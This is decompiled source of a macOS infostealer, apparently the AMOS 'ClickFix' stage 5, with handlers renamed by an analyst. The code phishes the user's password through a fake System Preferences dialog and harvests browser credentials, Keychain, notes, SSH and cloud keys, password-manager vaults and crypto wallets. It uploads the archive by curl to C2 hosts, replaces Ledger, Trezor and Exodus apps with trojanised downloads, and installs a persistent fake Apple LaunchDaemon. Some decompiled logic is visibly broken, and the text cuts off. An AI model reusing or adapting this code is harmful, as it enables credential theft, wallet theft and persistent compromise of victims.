-- AMOS ClickFix stage 5, run-only AppleScript.
-- Recovered with pberba/applescript-decompiler; handler, global and parameter
-- identifiers renamed by hand from the operator's obfuscated names to describe
-- what each routine does. Local variables are left as vN. Behaviour is unchanged.

on makeDir(arg_rlko)
    try
        (do shell script "mkdir -p " & (quoted form of arg_rlko))
    on error
        return
    end try
end makeDir

on readFileOrEmpty(path)
    try
        set v1 to psxf path
        set v2 to (read v1)
        return v2
    on error

    end try
    return ""
end readFileOrEmpty

on baseName(path)
    try
        set v1 to ((reverse of (every characters of path)) as plain text)
        set v2 to (offset of "/" in v1) - 1
        set v3 to (text of (1 thru v2 of v1))
        set v4 to ((reverse of (every characters of v3)) as plain text)
        return v4
    on error

    end try
    return ""
end baseName

on dirName(path)
    try
        set v1 to (offset of "/" in ((reverse of (every characters of path)) as plain text))
        set v2 to (text of (1 thru -(v1 + 1) of path))
        return v2
    on error

    end try
    return ""
end dirName

on writeToFile(arg_khqk, path)
    try
        set v2 to dirName(path)
        makeDir(v2)
        set v3 to (open for access path write permission true)
        (set eof v3 to 0)
        (write arg_khqk to v3 starting at rdwreof )
        (close access v3)
    on error
        return
    end try
end writeToFile

on copyFile(srcDir, arg_kkdw)
    try
        set v2 to dirName(arg_kkdw)
        makeDir(v2)
        (do shell script "cp -f " & (quoted form of srcDir) & " " & (quoted form of arg_kkdw))
    on error
        return
    end try
end copyFile

on readwriteFile(srcDir, arg_kkdw)
    try
        set v2 to dirName(arg_kkdw)
        makeDir(v2)
        (do shell script "cat " & (quoted form of srcDir) & " > " & (quoted form of arg_kkdw))
    on error
        return
    end try
end readwriteFile

on pathType(arg_rlko)
    try
        set v1 to (do shell script "file -b " & (quoted form of arg_rlko))
    on error
        if "directory" then
            return true
            v1
        end if
    end try
    return false
end pathType

on copyTreeFiltered(srcDir, arg_kkdw)
    try
        set v2 to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "GPUCache", "DawnCache", "Crashpad", "DawnWebGPUCache", "DawnGraphiteCache", "__update__", "tor", "dumps", "emoji", "user_data", "user_data#2", "user_data#3"}
        set v3 to (list folder srcDir invisibles false)
        makeDir(arg_kkdw)
    on error
        repeat with v4 in v3
            set v5 to (contents of v4)
            if not (v2 contains v5) then
                set v6 to srcDir & "/" & v5
                set v7 to arg_kkdw & "/" & v5
                if pathType(v6) then
                    copyTreeFiltered(v6, v7)
                else
                    copyFile(v6, v7)
                end if
            end if
        end repeat
        return
    end try
end copyTreeFiltered

on copyTreeSizeCapped(srcDir, arg_kkdw, arg_mnah)
    try
        set v3 to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "GPUCache", "DawnCache", "Crashpad", "DawnWebGPUCache", "DawnGraphiteCache", "__update__", "tor", "dumps", "emoji", "user_data", "user_data#2", "user_data#3", "logs", "Logs", "blob_storage", "Session Storage", "Service Worker"}
        set v4 to (list folder srcDir invisibles false)
        makeDir(arg_kkdw)
    on error
        repeat with v5 in v4
            if gmojngyq ≥ arg_mnah then
                exit repeat
            end if
            set v6 to (contents of v5)
            if not (v3 contains v6) then
                set v7 to srcDir & "/" & v6
                set v8 to arg_kkdw & "/" & v6
                if pathType(v7) then
                    copyTreeSizeCapped(v7, v8, arg_mnah)
                else
                    try
                        set v9 to ((do shell script "stat -f%z " & (quoted form of v7) & " 2>/dev/null || echo 0") as integers)
                    on error
                        if v9 <  and (gmojngyq + v9 < arg_mnah as booleans) then
                            copyFile(v7, v8)
                            set gmojngyq to gmojngyq + v9
                        end if
                    end try
                end if
            end if
        end repeat
        return
    end try
end copyTreeSizeCapped

on extractValueAfter(path, needle)
    try
        set v2 to psxf path
        set v3 to (read v2)
        set v4 to (offset of needle in v3)
        if v4 is 0 then
            return "not found"
        end if
        set v5 to v4 + (length of needle)
        set v6 to (text of (v5 thru v5 + 55 of v3))
        set v7 to (offset of "\\" in v6)
        if v7 is 0 then
            return "not found"
        end if
        set v8 to (text of (v5 thru v5 + v7 - 2 of v3))
        return v8
    on error
        return "not found"
    end try
end extractValueAfter

on collectMozExtStorage(arg_ticu, dstDir)
    try
        set v2 to arg_ticu & "/storage/default/"
        set v3 to (list folder v2 invisibles false)
    on error
        return
        if "moz-extension" then
            set v5 to v2 & v4 & "/idb/"
            try
                set v6 to (list folder v5 invisibles false)
            on error
                repeat with v7 in v6
                    if ".sqlite" then
                        copyFile(v5 & v7, dstDir & "/" & v4 & "/" & v7)
                    else
v7
                    end if
                    v4
                end repeat
            end try
        end if
        repeat with v4 in v3
        end repeat
    end try
end collectMozExtStorage

on collectFirefoxProfile(arg_azdo, arg_ktid, dstDir, arg_jxxy)
    try
        set v4 to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json", "/extensions.json", "/extension-preferences.json", "/prefs.js"}
        if arg_jxxy is "true" then
            set v4 to v4 & {"/places.sqlite"}
        end if
        set v5 to (list folder arg_ktid invisibles false)
    on error
        repeat with v6 in v5
            set v7 to dstDir & "ff/" & arg_azdo & "_" & v6
            collectMozExtStorage(arg_ktid & v6, v7)
            set v8 to arg_ktid & v6
            repeat with v9 in v4
                copyFile(v8 & v9, v7 & v9)
            end repeat
        end repeat
        return
    end try
end collectFirefoxProfile

on folderContainsAny(srcDir, nameList)
    try
        set v2 to (list folder srcDir invisibles false)
    on error
        repeat with v3 in v2
            repeat with v4 in nameList
                if v3 contains v4 then
                    return true
                end if
            end repeat
        end repeat
    end try
    return false
end folderContainsAny

on copyMatchingEntries(srcDir, dstDir, nameList, nestFlag)
    try
        set v4 to (list folder srcDir invisibles false)
    on error
        repeat with v5 in v4
            repeat with v6 in nameList
                if v5 contains v6 then
                    set v7 to srcDir & v5
                    set v8 to dstDir & "/" & v6
                    set v9 to true
                    if nestFlag then
                        set v8 to v8 & "/" & v5
                    end if
                    if v9 then
                        copyTreeFiltered(v7, v8)
                    end if
                end if
            end repeat
        end repeat
        return
    end try
end copyMatchingEntries

on collectChromiumProfile(dstDir, arg_pcpa, arg_jxxy)
    set v3 to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/", "/Local Storage/leveldb/"}
    if arg_jxxy is "true" then
        set v3 to v3 & {"/History"}
    end if
    repeat with v4 in arg_pcpa
        set v5 to (items 1 of v4)
        set v6 to (items 2 of v4)
        set v7 to dstDir & "Chromium/" & v5 & "_"
        try
            set v8 to (list folder v6 invisibles false)
        on error
            return
            if (v9 as plain text) is "Default" or ((v9 as plain text) contains "Profile" as booleans) then
                set v10 to false
                repeat with v11 in v3
                    set v12 to v6 & v9 & v11
                    set v13 to v11
                    if (v11 as plain text) is "/Network/Cookies" then
                        set v13 to "/Cookies"
                    end if
                    if (v11 as plain text) is "/Local Extension Settings/" then
                        if folderContainsAny(v12, v1) then
                            set v10 to true
                        end if
                        copyMatchingEntries(v12, v7 & v9, v1, false)
                    else
                        if (v11 as plain text) is "/IndexedDB/" then
                            if folderContainsAny(v12, v1) then
                                set v10 to true
                            end if
                            copyMatchingEntries(v12, v7 & v9, v1, true)
                        else
                            if (v11 as plain text) is "/Local Storage/leveldb/" then
                                if v10 then
                                    set v14 to v7 & v9 & "/Local Storage/leveldb/"
                                    copyTreeFiltered(v12, v14)
                                end if
                            else
                                set v14 to v7 & v9 & v13
                                copyFile(v12, v14)
                            end if
                        end if
                    end if
                end repeat
            end if
            repeat with v9 in v8
            end repeat
        end try
    end repeat
end collectChromiumProfile

on verifyPassword(buildId, arg_rxiu)
    try
        set v2 to (do shell script "dscl . authonly " & (quoted form of buildId) & space & (quoted form of arg_rxiu))
    on error
        if v2 is not "" then
            return false
        else
            return true
        end if
        return false
    end try
end verifyPassword

on showPasswordDialog(buildId, dstDir)
    try

    on error
        if verifyPassword(buildId, "") then
            set v2 to (do shell script "security find-generic-password -w -s 'Chrome Safe Storage' 2>/dev/null")
            if my isValidSafeKey((v2 as plain text)) then
                writeToFile((v2 as plain text), dstDir & "masterpass-chrome")
            end if
        else
            set v3 to true
            repeat
                if v3 then
                    set v4 to "You need to configure system settings before running this application." & return & "Please enter your password."
                else
                    set v4 to "The password you entered is incorrect." & return & "Please enter your password."
                end if
                set v5 to (display dialog v4 default answer "" with icon stic    buttons {"Continue"} default button "Continue" hidden answer true with title "System Preferences")
                set v6 to (ttxt of v5)
                set v3 to false
                if verifyPassword(buildId, v6) then
                    return v6
                end if
            end repeat
        end if
    end try
    return ""
end showPasswordDialog

on grabFiles(dstDir)
    try
        set v1 to dstDir & "FileGrabber/"
        set v2 to psxf v1
        set v3 to psxf v1 & "NotesMedia/"
        set v4 to {"txt", "pdf", "docx", "wallet", "key", "keys", "doc", "jpeg", "png", "kdbx", "rtf", "jpg", "seed"}
        set v5 to 0
        set v6 to 0
        set v7 to (do shell script "system_profiler SPHardwareDataType | awk '/UUID/ { print $3 }'")
        makeDir(v2)
        makeDir(v3)
        tell Finder
            try
                set v8 to (path to afdrcusr as text) & "Library:Cookies:"
                set v9 to v8 & "Cookies.binarycookies"
                (duplicate file v9 to folders v2 replacing true)
                set (name of result) to "saf1"
            on error

            end try
            set v10 to (path to afdrdlib from fldmfldu as text) & "Containers:com.apple.Safari:Data:Library:Cookies:"
            try
                (duplicate (file "Cookies.binarycookies" of folders v10) to folders v2 replacing true)
            on error

            end try
            set v11 to (path to afdrcusr as text) & "Library:Group Containers:group.com.apple.notes:"
            try
                set v12 to folders v11
                set v13 to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
            on error
                repeat with v14 in v13
                    try
                        (duplicate (file v14 of v12) to folders v2 replacing true)
                    on error

                    end try
                end repeat
            end try
            set v15 to v11 & "Accounts:"
            try
                set v16 to folders v15
                set v17 to (every folders of v16)
            on error
                repeat with v18 in v17
                    set v19 to v15 & (name of v18) & ":Media:"
                    set v20 to (every folders of folders v19)
                    repeat with v21 in v20
                        set v22 to v19 & (name of v21)
                        set v23 to (every folders of folders v22)
                        repeat with v24 in v23
                            set v25 to (every file of v24)
                            repeat with v26 in v25
                                try
                                    set v27 to (size of v26)
                                    set v6 to v6 + v27
                                on error
                                    if v6 < 30 * 1024 * 1024 then
                                        (duplicate v26 to v3 replacing true)
                                    else
                                        exit repeat
                                    end if
                                end try
                            end repeat
                        end repeat
                    end repeat
                end repeat
            end try
            try
                set v28 to (path to afdrdlib from fldmfldu as text) & "Safari:"
                (duplicate (file "Form Values" of folders v28) to v2 replacing true)
            on error

            end try
            try
                set v29 to (path to afdrdlib from fldmfldu as text) & "Keychains:" & v7
                (duplicate folders v29 to v2 replacing true)
            on error

            end try
            try
                set v30 to (every file of desktop)
                set v31 to (every file of (folders "Documents" of (path to afdrcusr)))
            on error
                repeat with v32 in v30 & v31
                    set v33 to (name extension of v32)
                    if v4 contains v33 then
                        set v27 to (size of v32)
                        if v5 + v27 < 30 * 1024 * 1024 then
                            try
                                (duplicate v32 to folders v2 replacing true)
                                set v5 to v5 + v27
                            on error

                            end try
                        else
                            exit repeat
                        end if
                    end if
                end repeat
            end try
        end tell
    on error
        return
    end try
end grabFiles

on exportNotesHtml(dstDir)
    try
        set v1 to ""
        set v2 to 0
        tell Notes
            set v3 to {}
            set v4 to  every acct
            repeat with v5 in v4
                try
                    set v6 to (pALL of (every note of v5))
                    set v2 to v2 + (length of v6)
                on error
                    repeat with v7 in v6
                        try
                            set v8 to (ascd of v7) & return & (body of v7)
                        on error

                        end try
                        end of (v3)
                    end repeat
                end try
                v8
            end repeat
            set v1 to (v3 as text)
        end tell
    on error
        if v2 > 0 then
            set v9 to "<h1>Notes Count: " & (v2 as text) & "</h1> <br><br><br> " & v1
            writeToFile(v9, dstDir & "FileGrabber/notes.html")
        end if
        return
    end try
end exportNotesHtml

on collectTelegram(dstDir, appSupport)
    try
        set v2 to appSupport & "Telegram Desktop/tdata/"
        set v3 to dstDir & "Telegram Data/"
        copyFile(v2 & "key_datas", v3 & "key_datas")
        set v4 to (list folder v2 invisibles false)
        set v5 to {}
        repeat with v6 in v4
            set v7 to v6 & "s"
            if v4 contains v7 then
                end of (v5)
            else
v6
            end if
        end repeat
    on error
        repeat with v8 in v5
            copyFile(v2 & v8 & "s", v3 & v8 & "s")
            copyFile(v2 & v8 & "/maps", v3 & v8 & "/maps")
        end repeat
        return
    end try
end collectTelegram

on uploadFields(telemetryC2, buildId, buildId, eventName, uploadFlag)
    set v5 to "-F \"u=" & buildId & "\" -F \"b=" & buildId & "\" -F \"l=" & eventName & "\" -F \"n=" & uploadFlag & "\""
    repeat with v6 from 1 to 3 by 1
        try
            (do shell script "curl --connect-timeout 120 --max-time 300 -X POST " & v5 & " -F \"file=@" & archivePath & "\" " & telemetryC2 & "/contact")
            return
        on error

        end try
        (delay 15)
    end repeat
    set v7 to "https://jadeleap15.com"
    repeat with v6 from 1 to 3 by 1
        try
            (do shell script "curl --connect-timeout 120 --max-time 300 -X POST " & v5 & " -F \"file=@" & archivePath & "\" " & v7 & "/contact")
            return
        on error

        end try
        (delay 15)
        return
    end repeat
end uploadFields

on replaceLedgerWallet(arg_fbvd, arg_ngjt, arg_dggw)
    try
        set v3 to "/Applications/Ledger Wallet.app"
        (list folder POSIX file v3)
        set v4 to arg_fbvd & "/.logged"
        (do shell script "rm -f " & (quoted form of v4))
        writeToFile("user100", arg_fbvd & "/.logged")
        set v5 to "/tmp/." & runPfx & "a_" & victimUuid & ".zip"
        (do shell script "curl -fsSL --connect-timeout 20 --max-time 120 -o " & (quoted form of v5) & " " & (quoted form of "https://" & arg_dggw & "/zxc/app.zip"))
        set v6 to (do shell script "head -c 2 " & (quoted form of v5) & " 2>/dev/null || echo ''")
        if v6 is not "PK" then
            return
        end if
        set v7 to ((do shell script "stat -f%z " & (quoted form of v5) & " 2>/dev/null || echo 0") as integers)
        if v7 <  then
            return
        end if
        try
            (do shell script "pkill \"Ledger Wallet\"")
        on error

        end try
        try
            (do shell script "rm -rf " & (quoted form of v3))
        on error
            if arg_ngjt is not "" then
                (do shell script "echo " & (quoted form of arg_ngjt) & " | sudo -S rm -r " & (quoted form of v3))
            end if
        end try
        (delay 1)
        (do shell script "ditto -x -k " & (quoted form of v5) & " /Applications")
        (delay 1)
        (do shell script "chmod -R +x " & (quoted form of v3))
        (delay 1)
        (do shell script "rm -f " & (quoted form of v5))
    on error
        return
    end try
end replaceLedgerWallet

on replaceTrezorSuite(arg_fbvd, arg_ngjt, arg_dggw)
    try
        set v3 to "/Applications/Trezor Suite.app"
        (list folder POSIX file v3)
        set v4 to arg_fbvd & "/.logged"
        (do shell script "rm -f " & (quoted form of v4))
        writeToFile("user100", arg_fbvd & "/.logged")
        set v5 to "/tmp/." & runPfx & "b_" & victimUuid & ".zip"
        (do shell script "curl -fsSL --connect-timeout 20 --max-time 120 -o " & (quoted form of v5) & " " & (quoted form of "https://" & arg_dggw & "/zxc/apptwo.zip"))
        set v6 to (do shell script "head -c 2 " & (quoted form of v5) & " 2>/dev/null || echo ''")
        if v6 is not "PK" then
            return
        end if
        set v7 to ((do shell script "stat -f%z " & (quoted form of v5) & " 2>/dev/null || echo 0") as integers)
        if v7 <  then
            return
        end if
        try
            (do shell script "pkill \"Trezor Suite\"")
        on error

        end try
        try
            (do shell script "rm -rf " & (quoted form of v3))
        on error
            if arg_ngjt is not "" then
                (do shell script "echo " & (quoted form of arg_ngjt) & " | sudo -S rm -r " & (quoted form of v3))
            end if
        end try
        (delay 1)
        (do shell script "ditto -x -k " & (quoted form of v5) & " /Applications")
        (delay 1)
        (do shell script "chmod -R +x " & (quoted form of v3))
        (delay 1)
        (do shell script "rm -f " & (quoted form of v5))
    on error
        return
    end try
end replaceTrezorSuite

on replaceExodus(arg_fbvd, arg_ngjt, arg_dggw)
    try
        set v3 to "/Applications/Exodus.app"
        (list folder POSIX file v3)
        set v4 to arg_fbvd & "/.logged"
        (do shell script "rm -f " & (quoted form of v4))
        writeToFile("user100", arg_fbvd & "/.logged")
        set v5 to "/tmp/." & runPfx & "c_" & victimUuid & ".zip"
        (do shell script "curl -fsSL --connect-timeout 20 --max-time 120 -o " & (quoted form of v5) & " " & (quoted form of "https://" & arg_dggw & "/zxc/appex.zip"))
        set v6 to (do shell script "head -c 2 " & (quoted form of v5) & " 2>/dev/null || echo ''")
        if v6 is not "PK" then
            return
        end if
        set v7 to ((do shell script "stat -f%z " & (quoted form of v5) & " 2>/dev/null || echo 0") as integers)
        if v7 <  then
            return
        end if
        try
            (do shell script "pkill \"Exodus\"")
        on error

        end try
        try
            (do shell script "rm -rf " & (quoted form of v3))
        on error
            if arg_ngjt is not "" then
                (do shell script "echo " & (quoted form of arg_ngjt) & " | sudo -S rm -r " & (quoted form of v3))
            end if
        end try
        (delay 1)
        (do shell script "ditto -x -k " & (quoted form of v5) & " /Applications")
        (delay 1)
        (do shell script "chmod -R +x " & (quoted form of v3))
        (delay 1)
        (do shell script "rm -f " & (quoted form of v5))
    on error
        return
    end try
end replaceExodus

on installAccountsdDaemon(home, password, exfilHost)
    try
        set v3 to home & "/Library/Application Support/.com.apple.accountsd"
        set v4 to v3 & "/AccountsHelper"
        set v5 to v3 & "/.service"
        set v6 to "com.apple.accountsd.helper"
        set v7 to "/Library/LaunchDaemons/" & v6 & ".plist"
        (do shell script "mkdir -p " & (quoted form of v3))
        set v8 to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>" & v6 & "</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/bash</string>\n        <string>" & v5 & "</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n</dict>\n</plist>"
        (do shell script "curl -fsSL -o " & (quoted form of v4 & ".tmp") & " https://" & exfilHost & "/zxc/kito")
        set v9 to ((do shell script "stat -f%z " & (quoted form of v4 & ".tmp") & " 2>/dev/null || echo 0") as integers)
        if v9 <  then
            (do shell script "rm -f " & (quoted form of v4 & ".tmp"))
            return
        end if
        (do shell script "mv -f " & (quoted form of v4 & ".tmp") & " " & (quoted form of v4))
        (do shell script "chmod +x " & (quoted form of v4))
        set v10 to "#!/bin/bash\nwhile true; do\n    CUSER=$(stat -f \"%Su\" /dev/console 2>/dev/null)\n    if [ -n \"$CUSER\" ] && [ \"$CUSER\" != \"root\" ]; then\n        sudo -u \"$CUSER\" " & (quoted form of v4) & "\n    else\n        ALTUSER=$(who 2>/dev/null | grep console | awk '{print $1}' | head -n 1)\n        AUID=$(id -u \"$ALTUSER\" 2>/dev/null)\n        if [ -n \"$AUID\" ]; then\n            launchctl asuser \"$AUID\" " & (quoted form of v4) & "\n        fi\n    fi\n    sleep 5\ndone"
        writeToFile(v10, v5 & ".tmp")
        (do shell script "tr -d '\\r' < " & (quoted form of v5 & ".tmp") & " > " & (quoted form of v5) & "; rm -f " & (quoted form of v5 & ".tmp"))
        (do shell script "chmod +x " & (quoted form of v5))
        set v11 to "/tmp/." & runPfx & "s_" & victimUuid
        writeToFile(v8, v11)
        (do shell script "echo " & (quoted form of password) & " | sudo -S chown root:wheel " & (quoted form of v11))
        (do shell script "echo " & (quoted form of password) & " | sudo -S mv -f " & (quoted form of v11) & " " & v7)
        try
            (do shell script "echo " & (quoted form of password) & " | sudo -S launchctl enable system/" & v6)
        on error

        end try
        try
            (do shell script "echo " & (quoted form of password) & " | sudo -S launchctl bootout system/" & v6)
        on error

        end try
        (do shell script "echo " & (quoted form of password) & " | sudo -S launchctl bootstrap system " & v7)
    on error
        return
    end try
end installAccountsdDaemon

on collectSystemInfo(home, apiToken)
    set v2 to home & "/Library/Application Support/.com.apple.accountsd"
    try
        (do shell script "mkdir -p " & (quoted form of v2))
    on error

    end try
    writeToFile(apiToken, v2 & "/.cfg.tmp")
    try
        (do shell script "mv -f " & (quoted form of v2 & "/.cfg.tmp") & " " & (quoted form of v2 & "/.cfg"))
    on error

    end try
    set v3 to ((random number from 10000 to ) as text)
    set v4 to "/tmp/" & v3 & "/"
    try
        set v5 to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
        writeToFile(v5, v4 & "info")
    on error

    end try
    return v4
end collectSystemInfo

on getAccountPassword(user, home, staging)
    set v3 to home & "/Library/Application Support/.com.apple.accountsd"
    set v4 to readFileOrEmpty(v3 & "/.auth")
    if not (verifyPassword(user, v4)) then
        set v4 to showPasswordDialog(user, staging)
        writeToFile(v4, v3 & "/.auth")
    end if
    return v4
end getAccountPassword

on collectNotes(staging, home, libraryDir, arg_wllc, arg_numu)
    try
        set v5 to libraryDir & "Group Containers/group.com.apple.notes/NoteStore.sqlite"
        copyFile(v5, staging & "FileGrabber/NoteStore.sqlite")
        copyFile(v5 & "-wal", staging & "FileGrabber/NoteStore.sqlite-wal")
        copyFile(v5 & "-shm", staging & "FileGrabber/NoteStore.sqlite-shm")
    on error
        if readFileOrEmpty(staging & "FileGrabber/NoteStore.sqlite") is "" then
            readwriteFile(v5, staging & "FileGrabber/NoteStore.sqlite")
            readwriteFile(v5 & "-wal", staging & "FileGrabber/NoteStore.sqlite-wal")
            readwriteFile(v5 & "-shm", staging & "FileGrabber/NoteStore.sqlite-shm")
        end if
    end try
    try
        copyFile(libraryDir & "Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", staging & "FileGrabber/Cookies.binarycookies")
    on error

    end try
    try
        copyFile(libraryDir & "Cookies/Cookies.binarycookies", staging & "FileGrabber/saf1")
    on error

    end try
    if arg_wllc is "true" then
        try
            grabFiles(staging)
        on error

        end try
    end if
    try
        copyTreeFiltered(libraryDir & "OpenVPN Connect/profiles/", staging & "OpenVPN")
    on error

    end try
    try
        set v6 to ""
        set v7 to (list folder "/Applications")
        repeat with v8 in v7
            set v6 to v6 & v8 & return
        end repeat
        writeToFile(v6, staging & "installedSoft")
    on error

    end try
    try
        set v9 to (do shell script "ps aux")
        writeToFile(v9, staging & "processes.txt")
    on error

    end try
    if arg_numu is "true" then
        try

        on error
            if readFileOrEmpty(staging & "FileGrabber/NoteStore.sqlite") is "" then
                exportNotesHtml(staging)
            end if
        end try
    else
        return
    end if
end collectNotes

on collectDiscordStickies(staging, appSupport, libraryDir)
    try
        collectTelegram(staging, appSupport)
    on error

    end try
    try
        copyTreeFiltered(appSupport & "discord/Local Storage/leveldb/", staging & "FileGrabber/Discord/leveldb/")
    on error

    end try
    try
        copyTreeFiltered(libraryDir & "Containers/Stickies/Data/Library/Stickies/", staging & "FileGrabber/Stickies/")
    on error
        return
    end try
end collectDiscordStickies

on collectKeychainSshAws(staging, home, libraryDir, user, isMacOS2641Plus)
    if isMacOS2641Plus is not "1" then
        try
            copyFile(libraryDir & "Keychains/login.keychain-db", staging & "login.keychain-db")
        on error

        end try
    end if
    try
        copyTreeFiltered(home & "/.ssh/", staging & "FileGrabber/ssh/")
    on error

    end try
    try
        copyFile(home & "/.aws/credentials", staging & "FileGrabber/aws/credentials")
    on error

    end try
    try
        copyFile(home & "/.aws/config", staging & "FileGrabber/aws/config")
    on error

    end try
    try
        copyFile(home & "/.config/gcloud/application_default_credentials.json", staging & "FileGrabber/gcloud/credentials.json")
    on error

    end try
    try
        copyFile(home & "/.config/gcloud/credentials.db", staging & "FileGrabber/gcloud/credentials.db")
    on error

    end try
    try
        copyTreeFiltered(home & "/.azure/", staging & "FileGrabber/azure/")
    on error

    end try
    try
        copyFile(home & "/.docker/config.json", staging & "FileGrabber/docker/config.json")
    on error

    end try
    try
        copyFile(home & "/.filezilla/sitemanager.xml", staging & "FileGrabber/filezilla/sitemanager.xml")
    on error

    end try
    try
        copyFile(home & "/.filezilla/recentservers.xml", staging & "FileGrabber/filezilla/recentservers.xml")
    on error

    end try
    try
        copyFile(home & "/.zsh_history", staging & "FileGrabber/zsh_history")
    on error

    end try
    try
        copyFile(home & "/.zshrc", staging & "FileGrabber/zshrc")
    on error

    end try
    try
        copyFile(home & "/.bash_history", staging & "FileGrabber/bash_history")
    on error

    end try
    try
        copyFile(home & "/.bashrc", staging & "FileGrabber/bashrc")
    on error

    end try
    writeToFile(user, staging & "username")
end collectKeychainSshAws

on collectFirefoxSafari(staging, appSupport, libraryDir, arg_apsp)
    set v4 to {{"Firefox", appSupport & "Firefox/Profiles/"}, {"Waterfox", appSupport & "Waterfox/Profiles/"}}
    repeat with v5 in v4
        try
            collectFirefoxProfile((items 1 of v5), (items 2 of v5), staging, arg_apsp)
        on error

        end try
    end repeat
    if arg_apsp is "true" then
        try
            copyFile(libraryDir & "Safari/History.db", staging & "SafariHistory.db")
        on error

        end try
    end if
    set v6 to {{"Chrome", appSupport & "Google/Chrome/"}, {"Brave", appSupport & "BraveSoftware/Brave-Browser/"}, {"Edge", appSupport & "Microsoft Edge/"}, {"Vivaldi", appSupport & "Vivaldi/"}, {"Opera", appSupport & "com.operasoftware.Opera/"}, {"OperaGX", appSupport & "com.operasoftware.OperaGX/"}, {"Chrome Beta", appSupport & "Google/Chrome Beta/"}, {"Chrome Canary", appSupport & "Google/Chrome Canary/"}, {"Chromium", appSupport & "Chromium/"}, {"Chrome Dev", appSupport & "Google/Chrome Dev/"}, {"Arc", appSupport & "Arc/User Data/"}, {"CocCoc", appSupport & "CocCoc/Browser/"}}
    try
        collectChromiumProfile(staging, v6, arg_apsp)
    on error
        return
    end try
end collectFirefoxSafari

on collectPasswordManagers(staging, home, appSupport, libraryDir)
    set v4 to 
    try
        copyTreeFiltered(libraryDir & "Group Containers/2BUA8C4S2C.com.1password/Library/Application Support/1Password/Data/", staging & "passmgr/1Password/Data/")
    on error

    end try
    try
        copyFile(appSupport & "Bitwarden/data.json", staging & "passmgr/Bitwarden/data.json")
    on error

    end try
    try
        copyTreeFiltered(home & "/Documents/Enpass/Vaults/primary/", staging & "passmgr/Enpass/")
    on error

    end try
    try
        copyTreeFiltered(appSupport & "Dashlane/profiles/", staging & "passmgr/Dashlane/profiles/")
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped(appSupport & "Keeper Password Manager/", staging & "passmgr/Keeper/", v4)
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped(appSupport & "com.stickypassword.passwordmanager/", staging & "passmgr/Sticky/", v4)
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped("/Library/Application Support/Cyclonis Password Manager/", staging & "passmgr/Cyclonis/", v4)
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped(appSupport & "NordPass/", staging & "passmgr/NordPass/", v4)
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped(appSupport & "Proton Pass/", staging & "passmgr/ProtonPass/", v4)
    on error

    end try
    try
        set gmojngyq to 0
        copyTreeSizeCapped(appSupport & "Roboform/", staging & "passmgr/RoboForm/", v4)
    on error
        return
    end try
end collectPasswordManagers

on collectDesktopWallets(staging, home, appSupport)
    set v3 to {{"Electrum", home & "/.electrum/wallets/"}, {"Coinomi", appSupport & "Coinomi/wallets/"}, {"Exodus", appSupport & "Exodus/"}, {"Atomic", appSupport & "atomic/Local Storage/leveldb/"}, {"Wasabi", home & "/.walletwasabi/client/Wallets/"}, {"Ledger_Live", appSupport & "Ledger Live/"}, {"Monero", home & "/Monero/wallets/"}, {"Bitcoin_Core", appSupport & "Bitcoin/wallets/"}, {"Litecoin_Core", appSupport & "Litecoin/wallets/"}, {"Dash_Core", appSupport & "DashCore/wallets/"}, {"Electrum_LTC", home & "/.electrum-ltc/wallets/"}, {"Electron_Cash", home & "/.electron-cash/wallets/"}, {"Guarda", appSupport & "Guarda/"}, {"Dogecoin_Core", appSupport & "Dogecoin/wallets/"}, {"Trezor_Suite", appSupport & "@trezor/suite-desktop/"}, {"Sparrow", home & "/.sparrow/wallets/"}}
    repeat with v4 in v3
        try
            copyTreeFiltered((items 2 of v4), staging & "deskwallets/" & (items 1 of v4))
        on error

        end try
    end repeat
    try
        copyFile(appSupport & "Binance/app-store.json", staging & "deskwallets/Binance/app-store.json")
    on error

    end try
    try
        copyFile(appSupport & "@tonkeeper/desktop/config.json", staging & "deskwallets/TonKeeper/config.json")
    on error
        return
    end try
end collectDesktopWallets

on archiveAndUpload(staging, telemetryC2, buildId, buildId, eventName, uploadFlag)
    try
        (do shell script "ditto -c -k --sequesterRsrc " & (quoted form of staging) & " " & (quoted form of archivePath))
        set v6 to "-F \"u=" & buildId & "\" -F \"b=" & buildId & "\" -F \"l=" & eventName & "\" -F \"n=" & uploadFlag & "\" -F \"p=1\""
        repeat with v7 from 1 to 3 by 1
            try
                (do shell script "curl --connect-timeout 30 --max-time 120 -X POST " & v6 & " -F \"file=@" & archivePath & "\" " & telemetryC2 & "/contact")
                return
            on error

            end try
            (delay 15)
        end repeat
        set v8 to "https://jadeleap15.com"
    on error
        repeat with v7 from 1 to 3 by 1
            try
                (do shell script "curl --connect-timeout 30 --max-time 120 -X POST " & v6 & " -F \"file=@" & archivePath & "\" " & v8 & "/contact")
                return
            on error

            end try
            (delay 15)
        end repeat
        return
    end try
end archiveAndUpload

on isValidSafeKey(k)
    try
        if k is "" then
            return false
        end if
        set v1 to (k as plain text)
        if v1 contains "could not be found" then
            return false
        end if
        if v1 contains "denied" then
            return false
        end if
        if v1 contains "User interaction is not allowed" then
            return false
        end if
        if v1 contains "The specified item could not be found" then
            return false
        end if
        if (count v1) < 8 then
            return false
        end if
        return true
    on error
        return false
    end try
end isValidSafeKey

on unlockChromeSafeStorageKey(dstDir, home, password)
    set v3 to " Safe Storage"
    set v4 to home & "/Library/Keychains/login.keychain-db"
    set v5 to password
    if v5 is "" then
        set v5 to "x"
    end if
    try
